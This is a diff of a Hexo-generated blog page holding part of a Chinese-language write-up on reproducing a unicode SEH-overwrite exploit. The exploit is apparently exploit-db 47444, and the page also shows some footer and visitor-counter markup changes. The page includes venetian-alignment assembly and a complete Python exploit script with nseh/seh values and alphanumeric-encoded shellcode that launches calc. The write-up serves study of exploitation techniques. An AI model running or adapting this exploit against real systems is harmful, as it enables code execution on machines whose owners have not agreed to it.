+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add</span> <span class="built_in">eax</span> <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="./6.png" alt></p>
+<p><img src="./6.png" alt=""></p>
 <p>最后ret到真正的shellcode处</p>
-<p><img src="./7.png" alt></p>
+<p><img src="./7.png" alt=""></p>
 <p>执行shellcode，创建calc进程</p>
-<p><img src="./8.png" alt></p>
+<p><img src="./8.png" alt=""></p>
 <p>这边有个问题，按理说padding+nseh+seh+padding+shellcode应该已经能弹calc了，动态调试结果也显示执行calc.exe，但是最后无论怎么改shellcode都是无法弹窗的，看了下作者所说的好像是有坏字符中断了执行流，分析了好久都没理解，很难受，如果有好心dalao知道希望能告知我一下，让我填了这个坑。</p>
 <p>这边作者只是在最后的padding后加了两字节unicode就能弹计算器了，神奇，哎，我太难了。</p>
 <p>PWN！！！</p>
-<p><img src="./9.png" alt></p>
-<h2 id="0x05-完整脚本"><a href="#0x05-完整脚本" class="headerlink" title="0x05 完整脚本"></a>0x05 完整脚本</h2><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python</span></span><br><span class="line">junk1 = <span class="hljs-string">"\x41"</span> * 260</span><br><span class="line">nseh  = <span class="hljs-string">"\x61\x43"</span></span><br><span class="line">seh   = <span class="hljs-string">"\x21\x7a"</span></span><br><span class="line">align  = <span class="hljs-string">""</span></span><br><span class="line">align += <span class="hljs-string">"\x43"</span> * 10                # Padding</span><br><span class="line">align += <span class="hljs-string">"\x58"</span>                     # POP EAX</span><br><span class="line">align += <span class="hljs-string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align += u<span class="hljs-string">"\uC083"</span> + <span class="hljs-string">"\x50"</span>         # <span class="hljs-builtin-name">ADD</span> EAX, 50</span><br><span class="line">align += <span class="hljs-string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align += <span class="hljs-string">"\x50"</span>                     # PUSH EAX</span><br><span class="line">align += <span class="hljs-string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align +=  u<span class="hljs-string">'\uC3C3'</span>                 # RETN</span><br><span class="line">junk2 = <span class="hljs-string">"\x43"</span> * 18</span><br><span class="line">junk3 = <span class="hljs-string">"\x44"</span> * 550 + u<span class="hljs-string">"\uD066"</span> + u<span class="hljs-string">"\u7FFD"</span> # u<span class="hljs-string">"\xF0FF"</span></span><br><span class="line">shellcode = <span class="hljs-string">"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0A"</span></span><br><span class="line">crash = junk1 + nseh + seh +<span class="hljs-built_in"> align </span>+ junk2 + shellcode + junk3</span><br><span class="line"><span class="hljs-builtin-name">print</span>(crash)</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="./9.png" alt=""></p>
+<h2 id="0x05-完整脚本"><a href="#0x05-完整脚本" class="headerlink" title="0x05 完整脚本"></a>0x05 完整脚本</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">junk1 = <span class="string">"\x41"</span> * 260</span><br><span class="line">nseh  = <span class="string">"\x61\x43"</span></span><br><span class="line">seh   = <span class="string">"\x21\x7a"</span></span><br><span class="line">align  = <span class="string">""</span></span><br><span class="line">align += <span class="string">"\x43"</span> * 10                # Padding</span><br><span class="line">align += <span class="string">"\x58"</span>                     # POP EAX</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align += u<span class="string">"\uC083"</span> + <span class="string">"\x50"</span>         # <span class="builtin-name">ADD</span> EAX, 50</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align += <span class="string">"\x50"</span>                     # PUSH EAX</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align +=  u<span class="string">'\uC3C3'</span>                 # RETN</span><br><span class="line">junk2 = <span class="string">"\x43"</span> * 18</span><br><span class="line">junk3 = <span class="string">"\x44"</span> * 550 + u<span class="string">"\uD066"</span> + u<span class="string">"\u7FFD"</span> # u<span class="string">"\xF0FF"</span></span><br><span class="line">shellcode = <span class="string">"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0A"</span></span><br><span class="line">crash = junk1 + nseh + seh +<span class="built_in"> align </span>+ junk2 + shellcode + junk3</span><br><span class="line"><span class="builtin-name">print</span>(crash)</span><br></pre></td></tr></table></figure>
 
 <p>贴下漏洞信息 <a href="https://www.exploit-db.com/exploits/47444" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47444</a> </p>
-</body></html>
+
     </div>
 
     
@@ -460,10 +458,40 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">xdw</span>
+  <span class="author" itemprop="copyrightHolder">XDW</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
+
+#<div class="powered-by">
+#    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+#    <i class="fa fa-user-md"></i>
+#    <span id="busuanzi_container_site_uv">
+#        本站访客数:<span id="busuanzi_value_site_uv"></span>
+#    </span>
+#    <span class="post-meta-divider">|</span>
+#    <span id="busuanzi_container_site_pv">
+#        本站访问量<span id="busuanzi_value_site_pv"></span>
+#    </span>
+#</div>
 
     </div>
   </footer>
@@ -489,6 +517,7 @@
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
